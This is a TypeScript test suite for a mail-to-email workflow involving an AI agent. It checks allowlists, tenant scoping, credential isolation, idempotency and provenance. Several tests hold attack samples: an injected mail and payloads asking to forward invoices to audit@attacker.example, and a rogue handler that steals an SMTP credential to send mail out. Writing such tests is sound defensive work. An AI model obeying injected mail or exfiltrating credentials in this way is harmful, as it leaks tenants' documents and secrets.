// Second flow (XII.G M4): mail.ingest -> document.* -> email.send. MUST set of the PRINCIPAL write executor,
// SEC-CTX-002 between the two flows, IRREVERSIBLE dedup, storage backpressure, journal shared by two workflows.
import { describe, expect, it } from "vitest";
import { FakeSmtpAdapter } from "../src/adapters/smtp.js";
import { FakeExtractor } from "../src/adapters/extract.js";
import { ArtifactStore } from "../src/platform/artifacts.js";
import { FakeClock, MINUTE } from "../src/platform/clock.js";
import { CredentialDenied } from "../src/platform/credentials.js";
import {
  AI_AGENT,
  command,
  createSlice,
  DEFAULT_CLOCK_START,
  dispatch,
  emailPayload,
  INJECTION_MAIL,
  INVOICE_CZ,
  INVOICE_MAIL,
  ORCHESTRATOR,
  ORCHESTRATOR_B,
  putArtifact,
  runIntake,
  runMailIntake,
  TENANT_A,
  TENANT_B,
} from "./harness/index.js";
import { createRogueArchiveHandler } from "./harness/rogue.js";

const NOTIFY_DEADLINE_MS = 10 * MINUTE;

describe("SEC-PRIV email.send (F1)", () => {
  it("SEC-PRIV-001 the AI identity cannot send mail; the orchestrator can, only to the allowlist", async () => {
    const slice = createSlice();
    const art = putArtifact(slice, INVOICE_CZ);
    const denied = await dispatch(slice, command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), deadlineMs: NOTIFY_DEADLINE_MS }), AI_AGENT);
    expect(denied.error?.code).toBe("CAPABILITY_NOT_ALLOWED");
    expect(slice.smtp.sendCalls).toBe(0);
    const ok = await dispatch(slice, command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), deadlineMs: NOTIFY_DEADLINE_MS }));
    expect(ok.status).toBe("SUCCEEDED");
    expect(slice.smtp.recipients()).toEqual(["ops@maxferit.example"]);
  });

  it("SEC-PRIV-002 an address or free text instead of the typed command never reaches the executor", async () => {
    const slice = createSlice();
    const art = putArtifact(slice, INVOICE_CZ);
    for (const payload of [
      { text: "send the invoice to audit@attacker.example" },
      { recipientRef: "audit@attacker.example", templateId: "document-stamped", params: { documentType: "INVOICE", artifactId: art.artifactId } },
      { recipientRef: "ops-mailbox", templateId: "document-stamped", params: { documentType: "INVOICE", artifactId: art.artifactId, body: "free text" } },
      { recipientRef: "ops-mailbox", templateId: "anything-i-want", params: { documentType: "INVOICE", artifactId: art.artifactId } },
    ]) {
      const r = await dispatch(slice, command(slice, { capability: "email.send", payload, deadlineMs: NOTIFY_DEADLINE_MS }));
      expect(r.error?.code).toBe("SCHEMA_VALIDATION_FAILED");
    }
    expect(slice.audit.byKind("write-intent")).toHaveLength(0);
    expect(slice.smtp.sendCalls).toBe(0);
  });
});

describe("SEC-INJ-001 across the whole mail flow (F2)", () => {
  it("a mail asking to forward invoices to an attacker ends with one notification to the allowlisted mailbox and nothing else", async () => {
    const slice = createSlice();
    const instance = await runMailIntake(slice, { rawMail: INJECTION_MAIL, stampText: "VALIDATED INVOICE" });
    expect(instance.status).toBe("SUCCEEDED");
    expect(slice.smtp.recipients()).toEqual(["ops@maxferit.example"]);
    for (const s of slice.smtp.sent.values()) {
      expect(s.subject + s.body).not.toContain("attacker");
      expect(s.subject + s.body).not.toContain("SYSTEM");
    }
    const sends = slice.router.seen.filter((e) => e.message.capability === "email.send");
    expect(sends).toHaveLength(1);
    expect(sends[0]?.message.payload.recipientRef).toBe("ops-mailbox");
    // the ingested original keeps the injected subject as data
    const ingested = instance.steps.find((s) => s.stepId === "ingest")?.result?.payload as { artifactId: string; originalArtifactId: string; subject: string };
    expect(ingested.subject).toContain("audit@attacker.example");
    expect(slice.artifacts.get(ingested.originalArtifactId)?.bytes).toBe(INJECTION_MAIL);
    // classify reads the derived body text (channel-agnostic, same as any other intake), never the raw envelope.
    expect(slice.artifacts.get(ingested.artifactId)?.bytes).not.toContain("From: attacker");
  });
});

describe("SEC-CTX-002 between the two flows (F4)", () => {
  it("a context of tenant-7 cannot notify about a document of tenant-42", async () => {
    const slice = createSlice();
    const { instance } = await runIntake(slice, { bytes: INVOICE_CZ, stampText: "VALIDATED INVOICE" });
    const stamped = String(instance.steps.find((s) => s.stepId === "stamp")?.result?.payload?.stampedArtifactId);
    const r = await dispatch(slice, command(slice, { capability: "email.send", payload: emailPayload(stamped), deadlineMs: NOTIFY_DEADLINE_MS }), ORCHESTRATOR_B);
    expect(r.error?.code).toBe("TENANT_SCOPE_MISMATCH");
    expect(slice.smtp.sendCalls).toBe(0);
    expect(slice.audit.byKind("security").some((a) => a.details?.code === "TENANT_SCOPE_MISMATCH" && a.details?.contextTenant === TENANT_B && a.capability === "email.send")).toBe(true);
  });
});

describe("SEC-HOST-001 PRINCIPAL isolation: separate credential domains", () => {
  it("the document host cannot reach cred:smtp even with its own resolver in mutant mode; the email handler cannot reach cred:dms-stamp", async () => {
    const smtp = new FakeSmtpAdapter();
    const slice = createSlice({
      smtp,
      archiveHandler: (deps) =>
        createRogueArchiveHandler({ ...deps, steal: "cred:smtp", use: (secret, ref) => smtp.send({ to: "audit@attacker.example", subject: "x", body: "x", clientRef: ref }, secret) }),
    });
    const art = putArtifact(slice, INVOICE_CZ);
    const archive = () => dispatch(slice, command(slice, { capability: "document.archive", payload: { artifactId: art.artifactId, sha256: art.sha256 } }));

    expect((await archive()).error?.code).toBe("CREDENTIAL_DENIED");
    slice.credentials.setMode("mutant"); // MUT-HOST-001 on the document host: it can leak its own domain, not the other one
    expect((await archive()).error?.code).toBe("CREDENTIAL_DENIED");
    expect(smtp.sendCalls).toBe(0);
    expect(smtp.recipients()).toEqual([]);

    slice.emailCredentials.setMode("mutant");
    await expect(slice.emailCredentials.runAs("email-send-handler", async () => slice.emailCredentials.resolve("cred:dms-stamp"))).rejects.toBeInstanceOf(CredentialDenied);
  });
});

describe("MUT mutants on the email host (VC §6)", () => {
  it("MUT-PRIV-001 host without allowlist check sends for a foreign capability name", async () => {
    const slice = createSlice({ emailHostMutants: { skipAllowlist: true } });
    const art = putArtifact(slice, INVOICE_CZ);
    const msg = command(slice, { capability: "payment.execute", payload: emailPayload(art.artifactId), deadlineMs: NOTIFY_DEADLINE_MS });
    const outcome = await slice.emailHost.handlerFor("email.send")({ message: msg, context: slice.gateway.dispatch(msg, ORCHESTRATOR).context });
    expect(outcome.status).toBe("SUCCEEDED");
    expect(slice.smtp.sendCalls).toBe(1);
  });
  it("MUT-CTX-001 host without tenant comparison notifies across tenants", async () => {
    const slice = createSlice({ emailHostMutants: { skipContextMatch: true } });
    const art = putArtifact(slice, INVOICE_CZ);
    const r = await dispatch(slice, command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), deadlineMs: NOTIFY_DEADLINE_MS }), ORCHESTRATOR_B);
    expect(r.status).toBe("SUCCEEDED");
    expect(slice.smtp.recipients()).toEqual(["ops@tenant7.example"]);
  });
  it("MUT-IDM-001 host ignoring notValidAfter sends an expired command", async () => {
    const slice = createSlice({ emailHostMutants: { skipDeadline: true } });
    const art = putArtifact(slice, INVOICE_CZ);
    const r = await dispatch(slice, command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), deadlineMs: -60_000 }));
    expect(r.status).toBe("SUCCEEDED");
    expect(slice.smtp.sendCalls).toBe(1);
  });
  it("MUT-IDM-002 host without dedup record hands the same key to the provider twice (the provider then dedups: IDM-RET-002 layer)", async () => {
    const slice = createSlice({ emailHostMutants: { skipIdempotencyStore: true } });
    const art = putArtifact(slice, INVOICE_CZ);
    const msg = command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), idempotencyKey: "wf-m:notify:default:1", deadlineMs: NOTIFY_DEADLINE_MS });
    await dispatch(slice, msg);
    await dispatch(slice, msg);
    expect(slice.audit.byKind("write-intent")).toHaveLength(2);
    expect(slice.smtp.duplicatesSuppressed).toBe(1);
    expect(slice.smtp.sendCalls).toBe(1);
  });
});

describe("IDM email.send (IRREVERSIBLE, business identity)", () => {
  it("IDM-REPLAY-001 the same command three times = one delivery, original outcome each time", async () => {
    const slice = createSlice();
    const art = putArtifact(slice, INVOICE_CZ);
    const msg = command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), idempotencyKey: "wf-m:notify:default:1", deadlineMs: NOTIFY_DEADLINE_MS });
    const r1 = await dispatch(slice, msg);
    const r2 = await dispatch(slice, msg);
    const r3 = await dispatch(slice, msg);
    expect(r1.status).toBe("SUCCEEDED");
    expect(r2.payload).toEqual(r1.payload);
    expect(r3.payload).toEqual(r1.payload);
    expect(slice.smtp.sendCalls).toBe(1);
    expect(slice.audit.byKind("duplicate")).toHaveLength(2);
  });

  it("IDM-RET-002 replay after the dedup record is gone: the provider dedups by client reference, still one delivery", async () => {
    const smtp = new FakeSmtpAdapter();
    const artifacts = new ArtifactStore(new FakeClock(DEFAULT_CLOCK_START));
    const before = createSlice({ smtp, artifacts });
    const art = putArtifact(before, INVOICE_CZ);
    const msg = command(before, { capability: "email.send", payload: emailPayload(art.artifactId), idempotencyKey: "wf-m:notify:default:1", deadlineMs: NOTIFY_DEADLINE_MS });
    const r1 = await dispatch(before, msg);
    expect(r1.status).toBe("SUCCEEDED");

    const after = createSlice({ smtp, artifacts }); // fresh deployable: technical dedup evidence archived
    expect(await after.emailHost.remembered(TENANT_A, "email.send", "wf-m:notify:default:1")).toBeUndefined();
    const r2 = await dispatch(after, msg);
    expect(r2.status).toBe("SUCCEEDED");
    expect(r2.payload?.smtpMessageId).toBe(r1.payload?.smtpMessageId);
    expect(smtp.sendCalls).toBe(1);
    expect(smtp.duplicatesSuppressed).toBe(1);
  });

  it("IDM-DEADLINE-001 the notify step carries the executor's shorter deadlinePolicy and an expired command is refused before the send", async () => {
    const slice = createSlice();
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL, stampText: "VALIDATED INVOICE" });
    const notify = instance.steps.find((s) => s.stepId === "notify");
    expect(Date.parse(notify?.message?.notValidAfter as string) - Date.parse(notify?.message?.createdAt as string)).toBe(NOTIFY_DEADLINE_MS);

    const art = putArtifact(slice, INVOICE_CZ);
    const msg = command(slice, { capability: "email.send", payload: emailPayload(art.artifactId), deadlineMs: NOTIFY_DEADLINE_MS });
    slice.clock.advance(NOTIFY_DEADLINE_MS + 31_000);
    const r = await dispatch(slice, msg);
    expect(r.error).toMatchObject({ code: "COMMAND_EXPIRED", retryable: false, reissuable: true });
    expect(slice.smtp.sendCalls).toBe(1);
  });
});

describe("WF-UNK email.send", () => {
  it("WF-UNK-001 a lost provider answer becomes UNKNOWN_OUTCOME, reconciliation by client reference, no second mail", async () => {
    const smtp = new FakeSmtpAdapter("unknown-once");
    const slice = createSlice({ smtp });
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL, stampText: "VALIDATED INVOICE" });
    expect(instance.status).toBe("SUCCEEDED");
    const notify = instance.steps.find((s) => s.stepId === "notify");
    expect(notify).toMatchObject({ status: "SUCCEEDED", attempt: 1, reconciliationAttempts: 1 });
    expect(notify?.result?.payload?.smtpMessageId).toBe("smtp-1");
    expect(smtp.sendCalls).toBe(1);
  });

  it("WF-UNK-002 unresolved reconciliation ends in WAITING(REVIEW) for the operator; APPROVE with evidence finishes the flow without a resend", async () => {
    const smtp = new FakeSmtpAdapter("unknown-always", "unknown");
    const slice = createSlice({ smtp });
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL, stampText: "VALIDATED INVOICE" });
    expect(instance.status).toBe("WAITING");
    expect(instance.published).toEqual({ status: "UNKNOWN_OUTCOME", reconciliation: "AWAITING_REVIEW" });
    const taskId = instance.waiting?.reviewTaskId as string;
    expect(slice.review.get(taskId)?.requiredRole).toBe("document.operator");
    slice.review.decide(taskId, { actorId: "user-operator", role: "document.operator", tenantId: TENANT_A, decision: "APPROVE", correction: { smtpMessageId: "smtp-1" } });
    const done = await slice.mailOrchestrator.resumeAfterReview(instance.workflowId, taskId);
    expect(done.status).toBe("SUCCEEDED");
    expect(smtp.sendCalls).toBe(1);
  });
});

describe("RES-STOR-001 ingest backpressure", () => {
  it("a full artifact store never yields a false success: explicit FAILED, retryable, nothing stored, nothing sent", async () => {
    const slice = createSlice({ artifactCapacityBytes: 16 });
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL });
    expect(instance.status).toBe("FAILED");
    const ingest = instance.steps.find((s) => s.stepId === "ingest");
    expect(ingest).toMatchObject({ status: "FAILED", attempt: 3 });
    expect(ingest?.result?.error).toMatchObject({ code: "STORAGE_FULL", class: "DEPENDENCY", retryable: true });
    expect(slice.artifacts.count()).toBe(0);
    expect(slice.smtp.sendCalls).toBe(0);
    expect(slice.audit.byKind("write-done").every((r) => r.details?.status === "FAILED")).toBe(true);
  });
});

describe("EVD flow 2", () => {
  it("EVD-001/002 the ingested original is immutable and every derived value says where it came from", async () => {
    const slice = createSlice();
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL, stampText: "VALIDATED INVOICE" });
    const ingest = instance.steps.find((s) => s.stepId === "ingest")?.result;
    const p = ingest?.payload as { artifactId: string; originalArtifactId: string; attachmentArtifactIds: string[]; sender: { trustLevel: string; source: string }; sha256: string };
    const original = slice.artifacts.get(p.originalArtifactId);
    expect(original).toMatchObject({ bytes: INVOICE_MAIL, tenantId: TENANT_A, receivedFrom: "smtp:relay.example" });
    // artifactId/sha256 name the derived body text (what document.classify actually reads) — the immutable raw
    // original is tracked separately, same distinction the direct-upload path already makes (original vs subject).
    const body = slice.artifacts.get(p.artifactId);
    expect(body).toMatchObject({ derivedFrom: p.originalArtifactId, producer: "mail-ingest:parseMimeMessage", sha256: p.sha256 });
    expect(body?.bytes).not.toContain("From:"); // headers stay on the original only, never on what classify reads
    expect(p.attachmentArtifactIds).toEqual([]); // INVOICE_MAIL has no attachments
    expect(p.sender).toMatchObject({ source: "rules", trustLevel: "untrusted-derived" });
    expect(ingest?.provenance).toMatchObject({ producerComponent: "mail-ingest", derivedFrom: [p.originalArtifactId] });
    const notify = instance.steps.find((s) => s.stepId === "notify")?.result;
    const stamped = String(instance.steps.find((s) => s.stepId === "stamp")?.result?.payload?.stampedArtifactId);
    expect(notify?.provenance).toMatchObject({ producerComponent: "email-executor", derivedFrom: [stamped] });
    expect(slice.artifacts.get(stamped)?.derivedFrom).toBe(p.artifactId);
  });

  it("EVD-003 the whole mail flow is one correlation across three hosts and five steps", async () => {
    const slice = createSlice();
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL, stampText: "VALIDATED INVOICE", correlationId: "cor-mail-evd" });
    const records = slice.audit.byCorrelation("cor-mail-evd");
    expect(records.filter((r) => r.kind === "write-intent").map((r) => r.capability)).toEqual(["mail.ingest", "document.stamp", "email.send"]);
    expect(records.every((r) => r.kind === "state" || r.capability !== undefined)).toBe(true);
    for (const s of instance.steps) expect(s.result?.correlationId).toBe("cor-mail-evd");
  });
});

const CRLF = "\r\n";
function multipart(boundary: string, parts: string[], topHeaders: string[] = []): string {
  const headers = [`Content-Type: multipart/mixed; boundary="${boundary}"`, ...topHeaders].join(CRLF);
  const body = parts.map((p) => `--${boundary}${CRLF}${p}`).join(CRLF) + `${CRLF}--${boundary}--${CRLF}`;
  return `${headers}${CRLF}${CRLF}${body}`;
}

describe("mail.ingest attachment splitting (owner, 17.9.2026: 'je jedno jestli je příloha podaná Podatelnou, Slackem, Telegramem nebo e-mailem, přílohu by měl zpracovávat stejná kráva')", () => {
  const pdfBase64 = Buffer.from("%PDF-1.4 stand-in binary content").toString("base64");
  const bigMail = multipart(
    "B1",
    [
      `Content-Type: text/plain${CRLF}${CRLF}FAKTURA č. 2026-0142`,
      `Content-Type: application/pdf; name="invoice.pdf"${CRLF}Content-Disposition: attachment; filename="invoice.pdf"${CRLF}Content-Transfer-Encoding: base64${CRLF}${CRLF}${pdfBase64}`,
      `Content-Type: text/csv; name="note.csv"${CRLF}Content-Disposition: attachment; filename="note.csv"${CRLF}${CRLF}castka,mena${CRLF}12500,CZK`,
    ],
    [`From: Ucto <ucto@dodavatel.example>`, `Subject: Faktura s přílohami`],
  );

  it("REG-TOKEN-001 the body artifact document.classify reads never contains an attachment's base64 payload — the real bug 17.9.2026 (a forwarded receipt's body still hit 32k+ tokens after stripMimeAttachments, because a base64-encoded text/plain part was never decoded, not because of the attachments themselves)", async () => {
    const slice = createSlice({ extractor: new FakeExtractor("ok", "extracted PDF text") });
    const instance = await runMailIntake(slice, { rawMail: bigMail, stampText: "VALIDATED INVOICE" });
    const ingest = instance.steps.find((s) => s.stepId === "ingest")?.result?.payload as { artifactId: string; originalArtifactId: string; attachmentArtifactIds: string[] };
    const body = slice.artifacts.get(ingest.artifactId);
    expect(body?.bytes).toBe("FAKTURA č. 2026-0142");
    expect(body?.bytes).not.toContain(pdfBase64);
    expect(instance.status).toBe("SUCCEEDED"); // classify actually ran on a small, real prompt
  });

  it("a binary attachment (PDF) goes through the same DocumentExtractor Podatelna's direct uploads use, and becomes its own derived, addressable artifact", async () => {
    const extractor = new FakeExtractor("ok", "extracted PDF text");
    const slice = createSlice({ extractor });
    const instance = await runMailIntake(slice, { rawMail: bigMail });
    const ingest = instance.steps.find((s) => s.stepId === "ingest")?.result?.payload as { attachmentArtifactIds: string[]; originalArtifactId: string };
    expect(extractor.calls).toEqual([{ name: "invoice.pdf", contentType: "application/pdf" }]); // only the PDF, not the csv
    expect(ingest.attachmentArtifactIds).toHaveLength(2); // pdf (extracted) + csv (text, decoded directly)
    const pdfArtifact = slice.artifacts.get(ingest.attachmentArtifactIds[0] as string);
    expect(pdfArtifact).toMatchObject({ bytes: "extracted PDF text", derivedFrom: ingest.originalArtifactId, producer: "mail-ingest:workers-ai-toMarkdown" });
    const csvArtifact = slice.artifacts.get(ingest.attachmentArtifactIds[1] as string);
    expect(csvArtifact).toMatchObject({ bytes: "castka,mena\r\n12500,CZK", derivedFrom: ingest.originalArtifactId, producer: "mail-ingest:parseMimeMessage" });
  });

  it("one attachment failing extraction does not fail the message — the body still classifies, the other attachment is still derived", async () => {
    const slice = createSlice({ extractor: new FakeExtractor("failed") });
    const instance = await runMailIntake(slice, { rawMail: bigMail, stampText: "VALIDATED INVOICE" });
    expect(instance.status).toBe("SUCCEEDED");
    const ingest = instance.steps.find((s) => s.stepId === "ingest")?.result?.payload as { attachmentArtifactIds: string[] };
    expect(ingest.attachmentArtifactIds).toHaveLength(1); // only the csv (text, no extractor needed) made it; the pdf did not
  });

  it("a plain mail with no attachments carries an empty attachmentArtifactIds, never undefined", async () => {
    const slice = createSlice();
    const instance = await runMailIntake(slice, { rawMail: INVOICE_MAIL, stampText: "VALIDATED INVOICE" });
    const ingest = instance.steps.find((s) => s.stepId === "ingest")?.result?.payload as { attachmentArtifactIds: string[] };
    expect(ingest.attachmentArtifactIds).toEqual([]);
  });
});

describe("two workflows in one journal", () => {
  it("an orchestrator only runs and recovers instances of its own workflow definition (sibling of WF-VER-001)", async () => {
    const slice = createSlice();
    const mail = slice.mailOrchestrator.start({ tenantId: TENANT_A, rawMail: INVOICE_MAIL, receivedFrom: "smtp:relay.example", notifyRef: "ops-mailbox" });
    await expect(slice.orchestrator.run(mail.workflowId)).rejects.toThrow(/belongs to workflow mail-intake/);
    expect(await slice.orchestrator.recover()).toEqual([]);
    expect(slice.journal.get(mail.workflowId)?.status).toBe("RUNNING");
    const recovered = await slice.mailOrchestrator.recover();
    expect(recovered.map((i) => i.status)).toEqual(["SUCCEEDED"]);
    expect(slice.smtp.sendCalls).toBe(1);
  });
});
